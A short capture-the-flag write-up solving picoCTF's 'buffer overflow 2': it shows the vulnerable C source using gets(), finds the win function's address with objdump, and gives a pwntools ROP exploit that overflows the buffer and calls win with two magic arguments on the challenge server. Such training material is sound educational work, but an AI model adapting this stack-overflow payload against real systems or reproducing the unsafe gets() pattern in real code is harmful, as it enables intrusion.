# buffer overflow 2

This challenge from [picoCTf](https://play.picoctf.org/practice/challenge/259) is a buffer overflow where we need to set some arguments that are on the stack

Looking at the source code we will need to call the `win` function with the two arguments set to `0xCAFEF00D` and `0xF00DF00D`.

```c
#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

We can retrieve `win` adress using objdump:

```
❯ objdump -d vuln | grep win
08049296 <win>:
 80492cc:       75 2a                   jne    80492f8 <win+0x62>
 8049313:       75 1a                   jne    804932f <win+0x99>
 804931c:       75 14                   jne    8049332 <win+0x9c>
 804932d:       eb 04                   jmp    8049333 <win+0x9d>
 8049330:       eb 01                   jmp    8049333 <win+0x9d>
```

Then we can just [rop](https://docs.pwntools.com/en/stable/rop/rop.html#manual-rop) using pwntools:

```py
from pwn import *


elf = ELF('./vuln')
rop = ROP(elf)

rop.call(0x08049296, [0xCAFEF00D, 0xF00DF00D])
payload = b'A' * 112 + rop.chain()


r = remote('saturn.picoctf.net', 49846)

r.recvuntil(b'Please enter your string: ')
r.sendline(payload)
r.interactive()
```